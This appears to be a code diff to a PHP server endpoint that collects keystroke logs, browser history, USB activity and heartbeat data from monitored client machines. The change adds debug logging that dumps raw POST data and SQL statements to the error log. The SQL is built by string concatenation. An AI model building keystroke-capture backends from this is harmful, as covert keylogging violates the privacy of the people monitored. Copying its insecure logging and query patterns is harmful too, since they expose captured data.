@@ -20,19 +20,32 @@ $mysqli->set_charset('utf8');
 $ipaddr = $_SERVER['REMOTE_ADDR'];
 $ipitems = explode(".", $ipaddr);
 
+// Debug logging
+error_log("eventhandler.php called - IP: $ipaddr");
+error_log("POST data: " . json_encode($_POST));
+error_log("Content-Type: " . ($_SERVER['CONTENT_TYPE'] ?? 'not set'));
+
 $appVersion = isset($_POST['Version']) ? $_POST['Version'] : "1.0";
 $appEvent = isset($_POST['Event']) ? $_POST['Event'] : "none";
 $username = isset($_POST['Username']) ? $_POST['Username'] : "";
 
-$retObj = ['Status' => 'OK'];
-if ($appEvent == 'Tic') {
-    $macaddress = isset($_POST['MacAddress']) ? $_POST['MacAddress'] : "";
-    $lastBrowserTic = addMonitorTic($ipaddr, $macaddress, $appVersion, $username, $mysqli);
-    $retObj['LastBrowserTic'] = $lastBrowserTic;
-} else {
-    $json = file_get_contents('php://input');
+error_log("Initial appEvent: $appEvent, appVersion: $appVersion, username: $username");
 
-    // Decode the JSON
+$retObj = ['Status' => 'OK'];
+
+// Check if this is a Tic event (can be either form data or JSON)
+$isTicEvent = false;
+$macaddress = "";
+$username = "";
+
+// First check if it's a Tic event in form data (legacy support)
+if ($appEvent == 'Tic') {
+    $isTicEvent = true;
+    $macaddress = isset($_POST['MacAddress']) ? $_POST['MacAddress'] : "";
+    $username = isset($_POST['Username']) ? $_POST['Username'] : "";
+} else {
+    // Check if it's JSON data
+    $json = file_get_contents('php://input');
     $data = json_decode($json, true);
 
     if ($data) {
@@ -41,35 +54,48 @@ if ($appEvent == 'Tic') {
         $macaddress = $data['MacAddress'] ?? '';
         $username = $data['Username'] ?? '';
         
-        // Update username if provided in any event
-        if (!empty($username)) {
-            updateUsernameFromEvent($mysqli, $username);
-        }
-        
-        // Handle different event types
-        switch ($appEvent) {
-            case 'BrowserHistory':
-                $browserHistories = $data['BrowserHistories'];
-                // Process Browser History
-                addBrowserHistory($mysqli, $browserHistories);
-                break;
-            case 'KeyLog':
-                $keyLogs = $data['KeyLogs'];
-                // Process key logs
-                addKeyLogs($mysqli, $keyLogs);
-                break;
-            case 'USBLog':
-                $usbLogs = $data['USBLogs'];
-                // Process USB logs
-                error_log("USBLog event received: " . json_encode($data));
-                addUSBLogs($mysqli, $usbLogs);
-                break;
+        // Check if this is a Tic event in JSON format
+        if ($appEvent == 'Tic') {
+            $isTicEvent = true;
+        } else {
+            // Update username if provided in any event
+            if (!empty($username)) {
+                updateUsernameFromEvent($mysqli, $username);
+            }
+            
+            // Handle different event types
+            switch ($appEvent) {
+                case 'BrowserHistory':
+                    $browserHistories = $data['BrowserHistories'];
+                    // Process Browser History
+                    addBrowserHistory($mysqli, $browserHistories);
+                    break;
+                case 'KeyLog':
+                    $keyLogs = $data['KeyLogs'];
+                    // Process key logs
+                    addKeyLogs($mysqli, $keyLogs);
+                    break;
+                case 'USBLog':
+                    $usbLogs = $data['USBLogs'];
+                    // Process USB logs
+                    error_log("USBLog event received: " . json_encode($data));
+                    addUSBLogs($mysqli, $usbLogs);
+                    break;
+            }
         }
     } else {
         // Handle JSON decode error
         http_response_code(400);
         echo json_encode(['error' => 'Invalid JSON']);
+        $mysqli->close();
+        return;
     }
+}
+
+// Handle Tic event (from either form data or JSON)
+if ($isTicEvent) {
+    $lastBrowserTic = addMonitorTic($ipaddr, $macaddress, $appVersion, $username, $mysqli);
+    $retObj['LastBrowserTic'] = $lastBrowserTic;
 }
 
 $retJSON = json_encode($retObj);
@@ -80,14 +106,20 @@ $mysqli->close();
 
 function addMonitorTic($ip, $macaddr, $version, $username, $mysqli)
 {
+    // Debug logging
+    error_log("addMonitorTic called - IP: $ip, MAC: $macaddr, Version: $version, Username: $username");
+    
     $ip_info = getClientInfo($mysqli);
 
     if ($ip_info == null) {
+        error_log("addMonitorTic failed - getClientInfo returned null");
         return;
     }
 
     $monitor_ip_id = $ip_info['id'];
     $lastBrowserTic = $ip_info['last_browser_tic'] ? strtotime($ip_info['last_browser_tic']) : time();
+    
+    error_log("addMonitorTic - Monitor ID: $monitor_ip_id, Last Browser Tic: $lastBrowserTic");
 
     // Build the SQL update statement
     $update_fields = [
@@ -117,7 +149,14 @@ function addMonitorTic($ip, $macaddr, $version, $username, $mysqli)
     }
     
     $sql = "UPDATE tbl_monitor_ips SET " . implode(", ", $update_fields) . " WHERE id = '" . $monitor_ip_id . "'";
-    $mysqli->query($sql);
+    error_log("addMonitorTic - SQL: $sql");
+    
+    $result = $mysqli->query($sql);
+    if ($result) {
+        error_log("addMonitorTic - Update successful, affected rows: " . $mysqli->affected_rows);
+    } else {
+        error_log("addMonitorTic - Update failed: " . $mysqli->error);
+    }
 
     return $lastBrowserTic;
 }
